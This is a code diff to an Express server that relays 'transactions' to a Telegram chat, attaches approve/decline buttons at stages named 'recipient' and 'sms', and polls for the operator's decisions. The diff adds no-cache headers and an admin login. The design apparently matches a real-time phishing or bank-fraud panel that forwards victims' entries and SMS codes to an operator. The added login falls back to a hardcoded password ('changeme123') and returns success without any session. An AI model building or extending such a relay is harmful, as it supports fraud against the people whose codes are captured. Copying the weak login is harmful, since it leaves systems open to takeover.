@@ -5,8 +5,20 @@ const app = express();
 app.use(express.json({ limit: '1mb' }));
 app.use(express.static(__dirname));
 
+// ============================================================
+// NO-CACHE HEADERS (so admin edits show up immediately)
+// ============================================================
+app.use((req, res, next) => {
+  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+  res.setHeader('Pragma', 'no-cache');
+  res.setHeader('Expires', '0');
+  next();
+});
+
 const BOT_TOKEN = () => process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID   = () => process.env.TELEGRAM_CHAT_ID;
+const ADMIN_USER = () => process.env.ADMIN_USER || 'admin';
+const ADMIN_PASS = () => process.env.ADMIN_PASS || 'changeme123';
 
 // ============================================================
 // TRANSACTION STORE
@@ -52,7 +64,6 @@ async function sendTelegram(text, replyMarkup = null) {
   }
 }
 
-// Edit an existing Telegram message (used to remove buttons after decision)
 async function editTelegramMessage(chatId, messageId, text, replyMarkup = null) {
   if (!BOT_TOKEN()) return;
   try {
@@ -76,7 +87,6 @@ async function editTelegramMessage(chatId, messageId, text, replyMarkup = null) 
   }
 }
 
-// Answer a callback query (stops the button spinner)
 async function answerCallback(callbackQueryId, text = '') {
   if (!BOT_TOKEN()) return;
   try {
@@ -108,6 +118,31 @@ function buildApprovalKeyboard(txnId) {
 }
 
 // ============================================================
+// API: ADMIN LOGIN
+// ============================================================
+app.post('/api/admin/login', (req, res) => {
+  try {
+    const { username, password } = req.body || {};
+
+    if (!username || !password) {
+      return res.status(400).json({ ok: false, error: 'Username and password are required.' });
+    }
+
+    const userMatch = String(username) === String(ADMIN_USER());
+    const passMatch = String(password) === String(ADMIN_PASS());
+
+    if (userMatch && passMatch) {
+      return res.json({ ok: true });
+    }
+
+    return res.status(401).json({ ok: false, error: 'Invalid username or password.' });
+  } catch (err) {
+    console.error('Admin login error:', err);
+    res.status(500).json({ ok: false, error: 'Server error. Please try again.' });
+  }
+});
+
+// ============================================================
 // API: SEND MESSAGE + REGISTER TRANSACTION (with buttons)
 // ============================================================
 app.post('/api/telegram', async (req, res) => {
@@ -118,7 +153,6 @@ app.post('/api/telegram', async (req, res) => {
       return res.status(400).json({ ok: false, error: 'No message' });
     }
 
-    // Register / update transaction
     if (txnId) {
       const existing = transactions.get(txnId) || {
         createdAt: Date.now(),
@@ -135,7 +169,6 @@ app.post('/api/telegram', async (req, res) => {
       transactions.set(txnId, existing);
     }
 
-    // Attach buttons automatically for approval stages
     const needsButtons = withButtons !== false && txnId && (
       stage === 'recipient' ||
       stage === 'sms' ||
@@ -206,7 +239,6 @@ async function pollTelegram() {
           const dataStr = cq.data || '';
           const [action, txnId] = dataStr.split(':');
 
-          // Security: only accept from your chat
           if (String(cq.from.id) !== String(CHAT_ID()) && String(cq.message?.chat?.id) !== String(CHAT_ID())) {
             await answerCallback(cq.id, 'Unauthorized');
             continue;
@@ -226,14 +258,13 @@ async function pollTelegram() {
 
             await answerCallback(cq.id, '✅ Approved');
 
-            // Edit original message to show outcome + remove buttons
             const originalText = cq.message?.text || '';
             const updatedText = originalText + `\n\n✅ <b>APPROVED</b> at ${new Date().toLocaleTimeString('en-GB')}`;
             await editTelegramMessage(
               cq.message.chat.id,
               cq.message.message_id,
               updatedText,
-              null // remove buttons
+              null
             );
           } else if (action === 'decline') {
             txn.status = 'declined';
@@ -322,13 +353,14 @@ app.get('/health', (req, res) => {
   res.json({
     ok: true,
     telegramConfigured: !!(BOT_TOKEN() && CHAT_ID()),
+    adminConfigured: !!(ADMIN_USER() && ADMIN_PASS()),
     activeTransactions: transactions.size,
     uptime: Math.floor(process.uptime())
   });
 });
 
 // ============================================================
-// SERVE INDEX.HTML
+// SERVE INDEX.HTML FOR ALL OTHER ROUTES
 // ============================================================
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
@@ -338,6 +370,7 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`✅ Server running on port ${PORT}`);
   console.log(`   Telegram configured: ${!!(BOT_TOKEN() && CHAT_ID())}`);
+  console.log(`   Admin configured:    ${!!(ADMIN_USER() && ADMIN_PASS())}`);
   console.log(`   Starting Telegram poller...`);
   setTimeout(pollTelegram, 2000);
 });
